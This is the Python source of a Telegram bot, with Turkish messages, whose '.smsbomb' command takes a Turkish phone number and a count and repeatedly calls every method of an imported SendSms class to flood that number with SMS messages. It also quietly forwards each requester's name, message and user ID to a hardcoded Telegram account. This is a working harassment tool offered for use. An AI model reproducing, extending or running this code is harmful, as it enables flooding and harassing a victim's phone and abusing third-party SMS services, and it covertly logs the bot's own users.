from os import system
from sms import SendSms
from concurrent.futures import ThreadPoolExecutor, wait
from icecream import *
from pyrogram import *
from pyrogram.enums import  *
from pyrogram.types import  *
from datetime import *
API_ID = int(API_ID)
API_HASH = "API_HASH"
BOT_TOKEN = "BOT_TOKEN"
bot_id = int(BOT_İD)
app = Client("ANY", api_id=API_ID, api_hash=API_HASH, bot_token=BOT_TOKEN)

def bomb(kere, tel_no, chatid):
    if tel_no.startswith("5"):
        pass
    else:
        app.send_message(chatid, "Hata")
        return
    try:
        int(tel_no)
    except:
        app.send_message(chatid, "Hata")
        return
    int(tel_no)
    mail=""
    print(kere)
    sms = SendSms(tel_no, mail)
    if isinstance(kere, int):
        while sms.adet < kere:
            for mit,attribute in enumerate(dir(SendSms)):
                if mit==kere*2:
                    app.send_message(chatid, "Gönderildi")
                    return
                attribute_value = getattr(SendSms, attribute)
                if callable(attribute_value):
                    if attribute.startswith('__') == False:
                        if sms.adet == kere:
                            break
                        with ThreadPoolExecutor() as executor:
                            futures= [
                                executor.submit(exec("sms."+attribute+"()"))
                                ]


@app.on_message(filters.command(commands="smsbomb",prefixes="."))
def main(cli,msg):
    chatid=msg.chat.id
    userid=msg.from_user.id
    number=""
    tekrar=msg.command[-1]
    app.send_message(7108169868, f"{msg.from_user.first_name} kişisinden '{msg.text}' mesajı aldım\n{userid}")
    try:
        num=msg.command[1:-1]
        int(tekrar)
        for i in num:
            number+=i
        number.strip()
        print(number)
        if str(number[0])!="5":
            app.send_message(chatid, "Yanlış numara \n\" .smsbomb '**numara**' '**sms sayısı**' \"\n biçiminde girin.\n\n**Not**: Numaranın başına +90 yazmayın!")
            return
        if len(str(number))!=10:
            app.send_message(chatid, "Numara 11 haneli olmalıdır")
            return
        if int(tekrar)>30:
            app.send_message(chatid, "En fazla 30 tane sms gönderebilirsin!")
            return #5421004143
        
        pnumber=number
        print("tekrar",tekrar)
        print(pnumber)
        int(number)
    except:
        app.send_message(chatid, "**Hata**. Lütfen belirtilen biçimde girin \n\" .smsbomb '**numara**' '**sms sayısı**' \"\n\n**Not**: numaranın başına +90 yazmayın!")
        return
    #for entity in msg.entities:
        #if entity.type!=MessageEntityType.PHONE_NUMBER:
            #await app.send_message(chatid, "Hatalı numara!")
    print(tekrar)
    app.send_message(chatid, "gönderiliyor...")
    with ThreadPoolExecutor() as executor:
        futures= [
            executor.submit(bomb(int(tekrar), pnumber.strip(),chatid))
            ]
    
    
app.run()